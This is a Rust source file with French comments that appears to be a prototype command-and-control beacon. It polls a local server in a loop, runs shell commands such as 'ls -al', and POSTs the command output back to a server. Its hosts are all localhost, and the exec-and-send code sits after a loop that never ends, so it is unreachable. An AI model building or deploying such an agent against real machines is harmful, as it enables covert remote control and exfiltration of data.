use std::{
    io::{prelude::*, Result, Write},
    net::{TcpStream},
    thread,
    time::Duration,
    process::{Command, Output},
    str
};
use reqwest;

//Exemple utilisation de la commande
// let vecteur = vec!["-a".to_string(), "-l".to_string()];
// exec_commande_shell(String::from("ls"), vecteur);
fn exec_commande_shell(command : String, args : Vec<String>) -> std::io::Result<Command> {
    let mut base_command = Command::new(command);
    if args.len() > 0 {
        for i in 0..args.len() {
            base_command.arg(args[i].clone());
        }
    }
    base_command.status().expect("error executing command");
    return Ok(base_command);      
}

#[tokio::main]
async fn sending_request_with_result(mut result_command : String) -> std::io::Result<()> {
    let client = reqwest::Client::new();
    result_command = result_command.replace("\n", "n");
    result_command = result_command.replace("\r", "r");
    result_command.push_str("EOF");
    let response = client.post("http://127.0.0.1:8082/")
    .body(result_command) 
    .send()
    .await;
    match response{
        Ok(v) => {
            match v.status() {
                reqwest::StatusCode::OK => {
                    println!("Success!");
                    println!("{}", v.text().await.unwrap());
                },
                reqwest::StatusCode::UNAUTHORIZED => {
                    println!("Need to grab a new token");
                },
                _ => {
                    panic!("Uh oh! Something unexpected happened.");
                }
            };
        },
        Err(_err) => ()
    };
    return Ok(());
}


#[tokio::main]
async fn sending_request(t: u64) -> Result<()> {

    let client = reqwest::Client::new();
    client.get("http://0.0.0.0:8082/")
        .send()
        .await
        .expect("failed to get response")
        .text()
        .await
        .expect("failed to get payload");

    println!("{:?}", client);
    println!("toto");
    thread::sleep(Duration::from_millis(t));

    let mut stream = TcpStream::connect("127.0.0.1:7878")?;
    stream.write(&[1])?;
    stream.read(&mut [0; 128])?;
    return Ok(());
}


fn main() {
    let boucle : bool = true;
    let delay_in_sec: f64 = 5.0; 
    while boucle {
        let result = sending_request((delay_in_sec*(1000 as f64)) as u64);
        match result {
            Ok(_) =>  {()},
            _ => {println!("An error occured sending the request")}
        }
    }
    let vecteur = vec!["-a".to_string(), "-l".to_string()];
    let result_command = exec_commande_shell(String::from("ls"), vecteur);
    match result_command{
        Ok(mut v) => {
            let mut string_result = String::from("");
            for line in v.output() {
                string_result.push_str(str::from_utf8(&line.stdout).unwrap());
            }
            match sending_request_with_result(String::from(string_result.trim())){
                Ok(_) => {
                    println!("Request sent successfully");
                },
                Err(_) => {
                    println!("Error : Request not sent");
                },
            }
        },
        _ => {
            println!("An error occured executing host command line");
        }
    };
}